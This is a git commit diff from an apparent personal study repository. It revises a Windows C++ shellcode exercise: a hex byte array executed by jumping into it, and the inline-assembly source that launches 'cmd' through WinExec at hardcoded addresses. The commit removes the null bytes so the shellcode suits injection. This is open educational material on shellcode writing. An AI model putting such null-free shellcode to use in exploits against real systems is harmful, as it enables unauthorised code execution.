7162533badca71195390b70456f46340ba75786c
JaehunYoon <goodasd123@gmail.com>
2019-04-04 10:52:50 +0900

    Study - C++ : shell_code remove null byte

--- Programming Language/C++/Example/03 shell_code/shell_code1.cpp
+++ Programming Language/C++/Example/03 shell_code/shell_code1.cpp
@@ -1,23 +1,25 @@
 #include <stdio.h>
 
-char shellcode[] = "\xC6\x45\xFC\x63"
-                    "\xC6\x45\xFD\x6D"
-                    "\xC6\x45\xFE\x64"
-                    "\xC6\x45\xFF\x00"
-                    "\x6A\x05"
-                    "\x8D\x45\xFC"
-                    "\x50"
-                    "\xB8\x30\x3A\x9d\x76"
-                    "\xFF\xD0"
-                    "\x6A\x01"
-                    "\xB8\x20\x3A\x99\x76"
-                    "\xFF\xD0";
+char shellcode[] = 
+"\x33\xDB"
+"\x89\x5D\xFC"
+"\xC6\x45\xFC\x63"
+"\xC6\x45\xFD\x6D"
+"\xC6\x45\xFE\x64"
+"\x6A\x05"
+"\x8D\x45\xFC"
+"\x50"
+"\xB8\x30\x3A\xB2\x74"
+"\xFF\xD0"
+"\x6A\x01"
+"\xB8\x20\x3A\xAE\x74"
+"\xFF\xD0";
 
 int main() {
-    int* shell = (int*)shellcode;
-    __asm {
-        jmp shell
-    };
+	int* shell = (int*)shellcode;
+	__asm {
+		jmp shell
+	};
 
-    return 0;
+	return 0;
 }
--- Programming Language/C++/Example/03 shell_code/shellcode_cmd2.cpp
+++ Programming Language/C++/Example/03 shell_code/shellcode_cmd2.cpp
@@ -1,24 +1,26 @@
 #include <stdio.h>
 #include <tchar.h>
+#include <Windows.h>
 
 int _tmain(int argc, _TCHAR* argv[]) {
-    __asm {
-        // cmd
-        mov  byte ptr [ebp-4], 63h
-        mov  byte ptr [ebp-3], 6Dh
-        mov  byte ptr [ebp-2], 64h
-        mov  byte ptr [ebp-1], 0
-        // call WinExec('cmd', SW_SHOW)
-        push  5
-        lea  eax, [ebp-4]
-        push  eax
-        mov  eax, 0x769D3A30
-        call  eax
-        // call ExitProcess(1)
-        push  1
-        mov  eax, 0x76993A20
-        call  eax
-    }
+	__asm {
+		// cmd
+		xor ebx, ebx
+		mov [ebp-4], ebx
+		mov  byte ptr[ebp - 4], 63h
+		mov  byte ptr[ebp - 3], 6Dh
+		mov  byte ptr[ebp - 2], 64h
+		// call WinExec('cmd', SW_SHOW)
+		push  5
+		lea  eax, [ebp - 4]
+		push  eax
+		mov  eax, 0x74b23a30
+		call  eax
+		// call ExitProcess(1)
+		push  1
+		mov  eax, 0x74ae3a20
+		call  eax
+	}
 
-    return 0;
+	return 0;
 }
